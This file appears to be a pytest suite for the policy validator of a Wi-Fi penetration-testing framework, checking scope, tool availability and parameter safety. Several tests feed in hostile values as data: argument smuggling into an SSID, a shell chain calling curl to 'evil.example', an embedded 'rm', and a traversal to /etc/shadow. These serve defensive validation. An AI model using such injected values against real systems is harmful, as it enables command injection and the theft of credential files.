"""
Tests for ActionPolicy - the enforcement point between the Decision Engine and real execution.

These tests are deliberately independent of the host: capability availability is supplied through
``AssessmentState`` rather than probed, so the suite asserts the same verdicts on a Kali box with
the full toolchain installed and on a machine with none of it.
"""
from __future__ import annotations

import pytest

from wifi_framework.contracts import (
    ActionObjective,
    ActionOrigin,
    ActionRequest,
    ActionValidationResult,
    EntityRef,
    TargetType,
    ValidationStatus,
)
from wifi_framework.core.execution.registry import CapabilityRegistry
from wifi_framework.core.models.assessment_state import AssessmentState, InterfaceInfo
from wifi_framework.core.models.scope import AssessmentScope
from wifi_framework.core.policy import ActionPolicy, ParameterRule, PARAMETER_RULES
from wifi_framework.tools.registry_loader import load_all_adapters
from wifi_framework.utils.validation import validate_channel

IN_SCOPE_BSSID = "AA:BB:CC:DD:EE:FF"
OUT_OF_SCOPE_BSSID = "11:22:33:44:55:66"


@pytest.fixture(scope="module")
def registry() -> CapabilityRegistry:
    loaded = CapabilityRegistry()
    load_all_adapters(loaded)
    return loaded


def make_state(
    scope: AssessmentScope,
    *,
    available=(),
    unavailable=None,
    interfaces=None,
) -> AssessmentState:
    state = AssessmentState(scope=scope)
    for name in available:
        state.available_capabilities[name] = True
    for name, reason in (unavailable or {}).items():
        state.unavailable_capabilities[name] = reason
    for info in interfaces or []:
        state.interfaces[info.name] = info
    return state


def request(
    capability: str,
    implementation: str,
    *,
    interface=None,
    parameters=None,
    target_id=None,
    prepared=False,
    expected_outputs=None,
    action_id="action-1",
) -> ActionRequest:
    return ActionRequest(
        assessment_id="22222222-2222-4222-8222-222222222222",
        action_id=action_id,
        capability=capability,
        implementation=implementation,
        interface=interface,
        parameters=parameters or {},
        objective=ActionObjective.RESOLVE_INFORMATION_GAP,
        target=EntityRef(
            type=TargetType.ACCESS_POINT.value, id=target_id or IN_SCOPE_BSSID
        )
        if target_id or parameters is None or "bssid" not in (parameters or {})
        else EntityRef(type=TargetType.ACCESS_POINT.value, id=parameters["bssid"]),
        expected_outputs=list(expected_outputs or []),
        prepared=prepared,
        origin=ActionOrigin.PLANNER,
    )


# --------------------------------------------------------------------- ordering


def test_checks_run_in_specification_order(registry):
    """Section 11: structural, then scope, then capability, then parameters."""
    scope = AssessmentScope(authorized_bssids=[IN_SCOPE_BSSID])
    state = make_state(scope, available=["airodump-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("wireless_observation", "airodump-ng", interface="wlan0mon", prepared=True),
        state,
    )
    assert [check.type for check in result.checks] == [
        "structural",
        "scope",
        "capability",
        "parameters",
    ]


def test_invalid_contract_short_circuits_before_scope(registry):
    """An untrusted request must never be judged on scope - its fields cannot be believed."""
    policy = ActionPolicy(registry=registry, scope=AssessmentScope())
    result = policy.validate(request("wireless_observation", "airodump-ng", action_id=""))
    assert result.status == ValidationStatus.REJECTED
    assert [check.type for check in result.checks] == ["structural"]
    assert result.rejection["stage"] == "structural"
    assert result.rejection["code"] == "invalid_contract"


# ------------------------------------------------------------------------ scope


def test_invasive_action_outside_scope_is_hard_rejected(registry):
    scope = AssessmentScope(authorized_bssids=[IN_SCOPE_BSSID])
    state = make_state(scope, available=["aireplay-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "aireplay-ng",
            interface="wlan0mon",
            parameters={"bssid": OUT_OF_SCOPE_BSSID, "action": "deauth"},
            target_id=OUT_OF_SCOPE_BSSID,
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["stage"] == "scope"
    assert result.rejection["code"] == "scope_denied_wireless"
    # A scope refusal is never retriable: no change of circumstance authorises the target.
    assert result.rejection["retriable"] is False
    assert result.checks[1].status == "failed"


def test_scope_denial_takes_precedence_over_capability_unavailability(registry):
    """Even if the tool were missing, the operator-visible reason must be the scope refusal."""
    scope = AssessmentScope(authorized_bssids=[IN_SCOPE_BSSID])
    state = make_state(scope, unavailable={"aireplay-ng": "Tool 'aireplay-ng' not found"})
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "aireplay-ng",
            interface="wlan0mon",
            parameters={"bssid": OUT_OF_SCOPE_BSSID},
            target_id=OUT_OF_SCOPE_BSSID,
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "scope_denied_wireless"


def test_invasive_action_inside_scope_passes_the_scope_gate(registry):
    scope = AssessmentScope(authorized_bssids=[IN_SCOPE_BSSID])
    state = make_state(scope, available=["aireplay-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "aireplay-ng",
            interface="wlan0mon",
            parameters={"bssid": IN_SCOPE_BSSID, "action": "deauth"},
            prepared=True,
        ),
        state,
    )
    assert result.checks[1].status == "passed"
    assert result.rejection is None or result.rejection["stage"] != "scope"


def test_unauthorized_ssid_rejected_in_strict_mode(registry):
    scope = AssessmentScope(authorized_ssids=["TestNet"], strict_mode=True)
    state = make_state(scope, available=["aireplay-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "aireplay-ng",
            interface="wlan0mon",
            parameters={"ssid": "NeighbourNet"},
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "scope_denied_wireless"


def test_channel_outside_authorized_set_rejected(registry):
    scope = AssessmentScope(authorized_channels=[1, 6])
    state = make_state(scope, available=["airodump-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "airodump-ng",
            interface="wlan0mon",
            parameters={"channel": 11},
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "scope_denied_channel"


def test_unresolvable_capability_fails_closed_as_invasive(registry):
    """
    An unknown implementation cannot be shown to be passive, so it is treated as invasive.

    Treating it as passive would let an unresolvable request slip through the scope gate.
    """
    scope = AssessmentScope(authorized_bssids=[IN_SCOPE_BSSID])
    state = make_state(scope, available=[])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "not-a-real-tool",
            parameters={"bssid": OUT_OF_SCOPE_BSSID},
            target_id=OUT_OF_SCOPE_BSSID,
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["stage"] == "scope"


# ------------------------------------------------------------------- capability


def test_missing_tool_is_deferred_and_not_retriable(registry):
    scope = AssessmentScope()
    state = make_state(scope, unavailable={"airodump-ng": "Tool 'airodump-ng' not found"})
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("wireless_observation", "airodump-ng", interface="wlan0mon", prepared=True), state
    )
    assert result.status == ValidationStatus.DEFERRED
    assert result.rejection["code"] == "capability_unavailable"
    assert result.rejection["stage"] == "capability"
    # The binary will not appear mid-assessment, so replanning should not re-request it.
    assert result.rejection["retriable"] is False


def test_capability_absent_from_discovery_results_is_deferred(registry):
    """Discovery ran and reported neither available nor unavailable: treat as unavailable."""
    scope = AssessmentScope()
    state = make_state(scope, available=["nmap"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("wireless_observation", "airodump-ng", interface="wlan0mon", prepared=True), state
    )
    assert result.status == ValidationStatus.DEFERRED
    assert result.rejection["code"] == "capability_unavailable"


def test_monitor_mode_gap_is_deferred_but_retriable(registry):
    """Interface state can change (operator enables monitor mode), so this stays retriable."""
    scope = AssessmentScope()
    state = make_state(
        scope,
        available=["airodump-ng"],
        interfaces=[InterfaceInfo(name="wlan0", type="wifi", supports_monitor=False, is_up=True)],
    )
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("wireless_observation", "airodump-ng", interface="wlan0", prepared=True), state
    )
    assert result.status == ValidationStatus.DEFERRED
    assert result.rejection["code"] == "monitor_mode_unavailable"
    assert result.rejection["retriable"] is True


def test_interface_not_discovered_is_reported(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=["airodump-ng"], interfaces=[InterfaceInfo(name="eth0", type="ethernet")])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("wireless_observation", "airodump-ng", interface="wlan9", prepared=True), state
    )
    assert result.status == ValidationStatus.DEFERRED
    assert result.rejection["code"] == "interface_unknown"


def test_undiscovered_interface_is_deferred(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=["airodump-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("wireless_observation", "airodump-ng", prepared=True), state
    )
    assert result.status == ValidationStatus.DEFERRED
    assert result.rejection["code"] == "interface_required"


def test_implementation_cannot_fulfil_requested_capability(registry):
    """nmap cannot answer a wireless_observation request; say so rather than running it anyway."""
    scope = AssessmentScope()
    state = make_state(scope, available=["nmap"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("wireless_observation", "nmap", prepared=True), state
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "capability_mismatch"
    assert result.rejection["retriable"] is False


def test_expected_outputs_the_tool_cannot_produce_are_rejected(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=["iw_dev"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_interface",
            "iw_dev",
            prepared=True,
            expected_outputs=["handshake_captures"],
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "expected_outputs_unavailable"


def test_unregistered_implementation_is_rejected(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=[])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("wireless_observation", "not-a-real-tool", interface="wlan0mon", prepared=True),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "unknown_capability"


def test_capability_the_tool_does_not_provide_is_rejected(registry):
    """Requesting a capability the registered tool cannot deliver is a mismatch, not a deferral."""
    scope = AssessmentScope()
    state = make_state(scope, available=["airodump-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("telepathy", "airodump-ng", interface="wlan0mon", prepared=True), state
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "capability_mismatch"


# ------------------------------------------------------------------- parameters


def test_argument_injection_is_rejected_and_never_retried(registry):
    scope = AssessmentScope(authorized_ssids=["TestNet"])
    state = make_state(scope, available=["airodump-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "airodump-ng",
            interface="wlan0mon",
            parameters={"ssid": "-e TestNet --write /etc/passwd"},
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "argument_injection_risk"
    # The value came from observed state and would be regenerated unchanged.
    assert result.rejection["retriable"] is False


def test_shell_metacharacters_are_rejected(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=["nmap"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "network_discovery",
            "nmap",
            parameters={"note": "10.0.0.1 && curl evil.example"},
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "shell_metacharacter"


def test_control_characters_are_rejected(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=["airodump-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "airodump-ng",
            interface="wlan0mon",
            parameters={"ssid": "TestNet\nrm"},
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "control_character"


def test_path_traversal_is_rejected(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=["hashcat"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "credential_assessment",
            "hashcat",
            parameters={"wordlist": "/tmp/words/../../etc/shadow"},
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "path_traversal"


def test_bytes_parameters_are_rejected(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=["airodump-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "airodump-ng",
            interface="wlan0mon",
            parameters={"ssid": b"TestNet"},
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "bytes_parameter"


def test_malformed_mac_address_is_rejected(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=["airodump-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "airodump-ng",
            interface="wlan0mon",
            parameters={"bssid": "ZZ:ZZ:ZZ:ZZ:ZZ:ZZ"},
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "invalid_mac_address"


def test_channel_lists_are_validated_element_by_element(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=["airodump-ng"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "airodump-ng",
            interface="wlan0mon",
            parameters={"channels": [1, 6, 999]},
            prepared=True,
        ),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "invalid_channel"


def test_missing_required_parameter_is_retriable(registry):
    """A target that is missing now may be discovered later, so cool down rather than give up."""
    scope = AssessmentScope()
    state = make_state(scope, available=["nmap"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("network_discovery", "nmap", prepared=True), state
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "missing_parameter"
    assert result.rejection["retriable"] is True


def test_required_inputs_not_enforced_before_preparation(registry):
    """Parameters are derived by the Execution Engine during preparation, not before."""
    scope = AssessmentScope()
    state = make_state(scope, available=["nmap"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("network_discovery", "nmap", prepared=False), state
    )
    assert result.rejection is None or result.rejection["code"] != "missing_parameter"


def test_domain_shape_is_checked(registry):
    scope = AssessmentScope()
    state = make_state(scope, available=["curl"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("service_enumeration", "curl", parameters={"url": "not a host!"}, prepared=True),
        state,
    )
    assert result.status == ValidationStatus.REJECTED
    assert result.rejection["code"] == "invalid_domain"


def test_well_formed_request_is_approved(registry):
    scope = AssessmentScope(authorized_ssids=["TestNet"])
    state = make_state(scope, available=["iw_dev"])
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request("wireless_interface", "iw_dev", prepared=True), state
    )
    assert result.status == ValidationStatus.APPROVED
    assert result.rejection is None
    assert all(check.status == "passed" for check in result.checks)


# ------------------------------------------------------------- contract surface


def test_result_is_a_valid_serialisable_contract(registry):
    scope = AssessmentScope(authorized_bssids=[IN_SCOPE_BSSID])
    state = make_state(scope, unavailable={"aireplay-ng": "not installed"})
    result = ActionPolicy(registry=registry, scope=scope).validate(
        request(
            "wireless_observation",
            "aireplay-ng",
            interface="wlan0mon",
            parameters={"bssid": OUT_OF_SCOPE_BSSID},
            target_id=OUT_OF_SCOPE_BSSID,
            prepared=True,
        ),
        state,
    )
    assert isinstance(result, ActionValidationResult)
    assert result.action_id == "action-1"
    assert result.validate().ok
    reparsed = ActionValidationResult.parse(result.to_message())
    assert reparsed.to_dict() == result.to_dict()
    assert reparsed.rejection["issues"]
    assert reparsed.checks[1].issues[0]["level"] == "operational"


def test_parameter_rule_families_are_declared():
    assert {rule.name for rule in PARAMETER_RULES} == {
        "mac_address",
        "ssid",
        "channel",
        "ip_address",
        "network",
        "interface",
        "path",
        "domain",
    }
    assert all(isinstance(rule, ParameterRule) for rule in PARAMETER_RULES)


# ------------------------------------------------- channel scope gate coupling
#
# The scope check coerces a channel with int() and, on failure, skips the check with a
# comment saying parameter validation reports it. That coupling is load-bearing and
# invisible: if parameter validation ever accepted a value int() rejects, an
# out-of-scope channel would slip past the scope gate entirely, because the gate would
# have skipped it and nothing else would have caught it.
#
# Both sides use int() and catch (TypeError, ValueError), so the sets match by
# construction. These tests pin the construction rather than trusting it.


MALFORMED_CHANNELS = ["9.0", "0x9", "6abc", "abc", "", "  ", None, [9], {"channel": 9}, (9,), object()]

#: Values `int()` accepts, so the scope gate evaluates them normally. `9.5` truncates to
#: a channel the gate can check, which is the gate's business rather than a parse failure
#: - though `AssessmentScope.validate` refuses it as a malformed declaration.
PARSEABLE_CHANNELS = [9, "9", " 9 ", 9.5, 400]


@pytest.mark.parametrize("channel", MALFORMED_CHANNELS)
def test_a_channel_the_scope_gate_cannot_parse_is_refused_by_parameter_validation(channel):
    """For every value that makes the scope gate's `int()` raise, parameter validation
    must also refuse it - otherwise the value passes both checks."""
    with pytest.raises((TypeError, ValueError)):
        int(channel)  # confirms this value really does reach the gate's except branch

    ok, reason = validate_channel(channel)
    assert ok is False, f"{channel!r} skipped the scope gate and passed parameter validation"
    assert reason


@pytest.mark.parametrize("channel", [1, 6, 196, "6", " 11 "])
def test_a_channel_the_scope_gate_can_parse_is_accepted_by_parameter_validation(channel):
    """The other half: values the gate *can* check must not be refused by the parameter
    stage, or the gate's decision would be irrelevant."""
    ok, _reason = validate_channel(channel)
    assert ok is True, f"{channel!r} is a usable channel but parameter validation refused it"


#: Out-of-scope channels that reach a channel check. Measured, not assumed: the scope
#: gate takes the values `int()` accepts and the parameter stage takes the rest.
CHANNELS_CHECKED_AND_REFUSED = [
    (9, "scope_denied_channel"),
    ("9", "scope_denied_channel"),
    (" 9 ", "scope_denied_channel"),
    (400, "scope_denied_channel"),
    (9.5, "scope_denied_channel"),      # int(9.5) is 9, which is out of scope
    ("9.0", "invalid_channel"),
    ("0x9", "invalid_channel"),
    ("6abc", "invalid_channel"),
    ("abc", "invalid_channel"),
    ("  ", "invalid_channel"),
    ({"channel": 9}, "invalid_channel"),
]

#: Values the parameter layer treats as "no channel supplied", so they never reach a
#: channel check. They must still not come back approved.
CHANNELS_TREATED_AS_ABSENT = ["", None, [9], (9,)]


def test_every_out_of_scope_channel_is_refused_whichever_stage_catches_it():
    """End to end through the real policy: scope authorises 1, 6 and 11, so every other
    channel must be refused - by the scope gate when it can parse the value, and by
    parameter validation when it cannot. Which stage catches it does not matter;
    approval does."""
    registry = load_all_adapters(CapabilityRegistry())
    scope = AssessmentScope(authorized_channels=[1, 6, 11])
    policy = ActionPolicy(scope=scope, registry=registry)

    for channel, expected_code in CHANNELS_CHECKED_AND_REFUSED:
        action_request = request(
            "horst", "horst", interface="wlan0mon", parameters={"channel": channel}
        )
        result = policy.validate(action_request)
        rejection = result.rejection or {}

        assert result.status != "approved", f"channel {channel!r} was approved out of scope"
        assert rejection.get("code") == expected_code, (
            f"channel {channel!r} was refused as {rejection.get('code')} at the "
            f"{rejection.get('stage')} stage; the two stages between them must cover "
            "every value that reaches a channel check"
        )


def test_a_channel_treated_as_absent_is_never_approved():
    """These never reach a channel check, so they prove nothing about the gate - but a
    value the parameter layer cannot interpret must not turn into an authorization."""
    registry = load_all_adapters(CapabilityRegistry())
    scope = AssessmentScope(authorized_channels=[1, 6, 11])
    policy = ActionPolicy(scope=scope, registry=registry)

    for channel in CHANNELS_TREATED_AS_ABSENT:
        action_request = request(
            "horst", "horst", interface="wlan0mon", parameters={"channel": channel}
        )
        result = policy.validate(action_request)
        assert result.status != "approved", (
            f"channel {channel!r} was interpreted as no channel at all and approved"
        )


def test_an_in_scope_channel_is_not_refused_by_the_scope_gate():
    """Positive control: the gate must actually let authorized channels through, or the
    refusals above would also pass with a gate that refuses everything."""
    registry = load_all_adapters(CapabilityRegistry())
    scope = AssessmentScope(authorized_channels=[1, 6, 11])
    policy = ActionPolicy(scope=scope, registry=registry)

    for channel in [6, "6"]:
        result = policy.validate(request("horst", "horst", interface="wlan0mon", parameters={"channel": channel}))
        rejection = result.rejection or {}
        assert rejection.get("code") != "scope_denied_channel", (
            f"channel {channel!r} is authorised but the scope gate refused it"
        )
        assert rejection.get("code") != "invalid_channel", (
            f"channel {channel!r} is a valid channel but parameter validation refused it"
        )


# --------------------------------------------- mixed IPv4/IPv6 authorized scope
#
# `subnet_of` raises TypeError across address families instead of returning False, and
# the comparison sat outside the surrounding try. A scope authorizing both an IPv4 and an
# IPv6 network therefore crashed the scope check - and whether it crashed depended on the
# order the entries were declared, because an entry that matched first returned before the
# mismatched one was reached. Found by the type checker, not by a test.


def test_a_scope_authorizing_both_families_authorizes_both():
    from wifi_framework.core.policy.validator import ActionPolicy

    scope = AssessmentScope(authorized_networks=["10.0.0.0/24", "2001:db8::/32"])

    assert ActionPolicy._network_in_scope("10.0.0.5", scope, False) is True
    assert ActionPolicy._network_in_scope("2001:db8::5", scope, False) is True


def test_a_scope_authorizing_both_families_refuses_addresses_in_neither():
    from wifi_framework.core.policy.validator import ActionPolicy

    scope = AssessmentScope(authorized_networks=["10.0.0.0/24", "2001:db8::/32"])

    assert ActionPolicy._network_in_scope("11.0.0.5", scope, False) is False
    assert ActionPolicy._network_in_scope("2001:db9::5", scope, False) is False


def test_the_scope_answer_does_not_depend_on_declaration_order():
    """The crash was order-dependent: an IPv4 candidate against an IPv4-first scope
    matched before the mismatched comparison was reached, and against an IPv6-first scope
    it raised. Same scope, same answer, either way round."""
    from wifi_framework.core.policy.validator import ActionPolicy

    forward = AssessmentScope(authorized_networks=["10.0.0.0/24", "2001:db8::/32"])
    reversed_ = AssessmentScope(authorized_networks=["2001:db8::/32", "10.0.0.0/24"])

    for network in ["10.0.0.5", "2001:db8::5", "11.0.0.5", "2001:db9::5"]:
        assert ActionPolicy._network_in_scope(network, forward, False) is (
            ActionPolicy._network_in_scope(network, reversed_, False)
        ), f"{network} depends on the order the networks were declared"


def test_an_ipv6_network_parameter_does_not_crash_validation():
    """End to end through the policy: the `network` parameter is read from the request and
    checked against the authorized networks, so this is the path that raised."""
    registry = load_all_adapters(CapabilityRegistry())
    scope = AssessmentScope(
        authorized_networks=["10.0.0.0/24", "2001:db8::/32"],
        authorized_hosts=["10.0.0.1"],
    )
    policy = ActionPolicy(scope=scope, registry=registry)

    result = policy.validate(
        request(
            "nmap",
            "nmap",
            parameters={"target": "10.0.0.1", "network": "2001:db8::/64"},
        )
    )
    rejection = result.rejection or {}
    assert rejection.get("code") != "scope_denied_network", (
        "2001:db8::/64 is inside the authorised 2001:db8::/32"
    )


def test_an_out_of_scope_ipv6_network_is_refused_not_crashed():
    registry = load_all_adapters(CapabilityRegistry())
    scope = AssessmentScope(
        authorized_networks=["10.0.0.0/24", "2001:db8::/32"],
        authorized_hosts=["10.0.0.1"],
    )
    policy = ActionPolicy(scope=scope, registry=registry)

    result = policy.validate(
        request(
            "nmap",
            "nmap",
            parameters={"target": "10.0.0.1", "network": "2001:db9::/64"},
        )
    )

    assert result.status == "rejected"
    rejection = result.rejection or {}
    assert rejection.get("stage") == "scope", rejection
    assert rejection.get("code") == "scope_denied_network", rejection


def test_membership_checks_across_families_are_already_safe():
    """Pinned so the distinction stays understood: `in` returns False across families,
    which is why `is_ip_authorized` never had this bug, while `subnet_of` raises. A future
    change from one to the other would reintroduce it."""
    import ipaddress

    assert (ipaddress.ip_address("10.0.0.1") in ipaddress.ip_network("2001:db8::/32")) is False

    scope = AssessmentScope(authorized_networks=["10.0.0.0/24", "2001:db8::/32"])
    assert scope.is_ip_authorized("10.0.0.5") is True
    assert scope.is_ip_authorized("2001:db8::5") is True
    assert scope.is_ip_authorized("11.0.0.5") is False
